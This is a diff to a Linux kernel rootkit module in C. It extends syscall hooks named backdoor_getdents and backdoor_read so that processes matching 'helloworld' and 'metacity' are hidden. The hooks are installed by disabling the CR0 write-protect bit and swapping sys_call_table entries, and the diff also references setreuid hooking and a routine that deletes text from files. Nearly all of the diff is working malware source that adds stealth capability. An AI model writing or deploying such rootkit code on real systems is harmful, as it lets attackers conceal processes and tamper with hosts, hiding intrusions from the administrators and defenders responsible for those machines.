@@ -9,7 +9,15 @@
 #include <linux/fdtable.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
+#include <asm/unistd.h>
 #include <linux/cred.h>
+
+#include <linux/kobject.h>
+#include <linux/string.h>
+#include <linux/types.h>
+#include <linux/stat.h>
+#include <linux/fcntl.h>
+#include <linux/file.h>
 
 // check whether system is 32-bit or 64-bit to assign appropriate pointer size
 #if defined(__i386__)
@@ -128,7 +136,7 @@ void delete_text_from_file(char* text, char* file_path) {
         set_fs(get_ds());
 
 	// find our text in the file
-	vfs_read(filp, buf, size, &filp->f_pos);
+	vfs_read(filp, buf, size, &filp->f_pos); //
 	position = strstr(buf, text);
 	if (position == NULL) {
 
@@ -245,23 +253,26 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 //	========================
 //	Process Hiding
 //	========================
-#define HIDDEN_PROCESS "helloworld"
+#define HIDDEN_PROCESS1 "helloworld"
+#define HIDDEN_PROCESS2 "metacity"
 
 //helper function for getting process name from a PID
 void get_name_from_pid(char* pid, char* buff) {
 
-	//declare variable
+	//declare variables
 	struct file *fp;
 	mm_segment_t fs;
+	int size;
 	char *proc = "/proc/";
 	char *cmdline = "/comm";
-	char *buf = (char*) kcalloc(1, 16, GFP_KERNEL);
+	char *buf = (char*) kzalloc(1024, GFP_KERNEL);
 
 	//create the filepath to the process name
 	strcpy(buf, proc);
 	strcat(buf, pid);
 	strcat(buf, cmdline);
 	//printk("%s\n", buf);
+
 
 	//open the filepath if possible
 	fp = filp_open(buf,O_RDONLY,0);
@@ -274,12 +285,19 @@ void get_name_from_pid(char* pid, char* buff) {
 	fs = get_fs();
 	set_fs(KERNEL_DS);
 
+	// find file size
+	vfs_llseek(fp, 0, SEEK_END);
+	size = fp->f_pos;
+	vfs_llseek(fp, 0, SEEK_SET);
+
+
 	//read the process name into the buffer
-	int n = vfs_read(fp, buff, 16, &fp->f_pos);
+	//int n =
+	vfs_read(fp, buf, 1024, &fp->f_pos);
+	strcpy(buff, buf);
 	//printk("return %d buff %s\n", n, buff);
 
 	//cleanup
-	buff[n] = '\0';
 	filp_close(fp, NULL);
 	set_fs(fs);
 	kfree(buf);
@@ -295,15 +313,17 @@ asmlinkage int backdoor_getdents (unsigned int fd, struct linux_dirent *dirp, un
 	    char           d_name[];
 	};
 	struct linux_dirent *kdirp,*kdirp2;
-  long value,tlen;
-  long kdirplength = 0;
-
+  int value,tlen;
+  int kdirplength = 0;
+	char *pidname;
 	//run o_getdents
 	value = (*o_getdents) (fd, dirp, count);
   tlen = value;
 
+	pidname = kzalloc(1024, GFP_KERNEL);
+
 	//linux dirents for the current dirent being analyzed and for copying into the original
-	kdirp = (struct linux_dirent *) kmalloc(tlen, GFP_KERNEL);
+	kdirp = (struct linux_dirent *) kzalloc(tlen, GFP_KERNEL);
   kdirp2 = kdirp;
   copy_from_user(kdirp, dirp, tlen);
 
@@ -311,13 +331,14 @@ asmlinkage int backdoor_getdents (unsigned int fd, struct linux_dirent *dirp, un
 	while(tlen > 0)
   {
     kdirplength = kdirp->d_reclen;
-    tlen = tlen - kdirplength;
-		char* pidname = kcalloc(1, 16, GFP_KERNEL);
+    tlen = (tlen - kdirplength);
+
+
 		if (kdirp->d_name != NULL)
 		get_name_from_pid(kdirp->d_name, pidname);
 
 		//check if the process we want to hide is in the dirent being analyzed
-		if(strstr(pidname, HIDDEN_PROCESS) != NULL)
+		if(strstr(pidname, HIDDEN_PROCESS1) != NULL || strstr(pidname, HIDDEN_PROCESS2) != NULL)
     {
 			//if so, remove from the dirp so it cannot be read from
       memmove(kdirp, (char *) kdirp + kdirp->d_reclen, tlen);
@@ -329,11 +350,12 @@ asmlinkage int backdoor_getdents (unsigned int fd, struct linux_dirent *dirp, un
 			//else, go to the next dirent
       kdirp = (struct linux_dirent *) ((char *)kdirp + kdirp->d_reclen);
 		}
-		kfree(pidname);
+
   }
 	//copy our modified dirp to the original and return
   copy_to_user(dirp, kdirp2, value);
   kfree(kdirp2);
+	kfree(pidname);
   return value;
 }
 
@@ -374,14 +396,14 @@ void remove_setreuid(void) {
 	write_cr0(read_cr0() | 0x10000);
 }
 
-void add_getdents(){
+void add_getdents(void){
 
 	write_cr0(read_cr0() & (~ 0x10000));
 	o_getdents = (void*) xchg(&sys_call_table[__NR_getdents], backdoor_getdents);
 	write_cr0(read_cr0() | 0x10000);
 }
 
-void remove_getdents(){
+void remove_getdents(void){
 
 	write_cr0(read_cr0() & (~ 0x10000));
 	xchg(&sys_call_table[__NR_getdents], o_getdents);
